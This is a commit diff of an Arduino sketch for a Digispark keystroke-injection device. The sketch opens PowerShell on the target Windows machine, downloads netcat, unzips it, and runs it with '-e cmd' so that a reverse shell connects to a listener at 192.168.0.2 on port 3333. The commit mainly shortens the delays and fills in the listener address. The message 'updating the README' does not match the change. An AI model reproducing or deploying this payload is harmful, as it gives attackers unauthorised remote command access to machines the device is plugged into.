6569f65f62d09b99d4a40e8d3c23dd49acb10efb
Kevin <kmanc@comcast.net>
2017-01-07 17:52:21 -0800

    updating the README

--- nc_connect/nc_connect.ino
+++ nc_connect/nc_connect.ino
@@ -2,36 +2,36 @@
 
 void setup() {
   // open start menu
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // open powershell
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // cd to C drive
   DigiKeyboard.print("cd C:\\");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // make new folder
   DigiKeyboard.print("mkdir TEMP");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // download netcat to the temp folder
   DigiKeyboard.print("Invoke-Webrequest -Uri https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -Outfile C:\\TEMP\\nc.zip");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // unzip netcat
   DigiKeyboard.print("Expand-Archive -Path C:\\TEMP\\nc.zip -DestinationPath C:\\TEMP\\nc");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // cd to the place that netcat will be
   DigiKeyboard.print("cd C:\\TEMP\\nc\\netcat-1.11");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(250);
   // connect back to listener with netcat
-  DigiKeyboard.print(".\\nc.exe {IP OF LISTENING DEVIE} 3333 -e cmd");
+  DigiKeyboard.print(".\\nc.exe 192.168.0.2 3333 -e cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
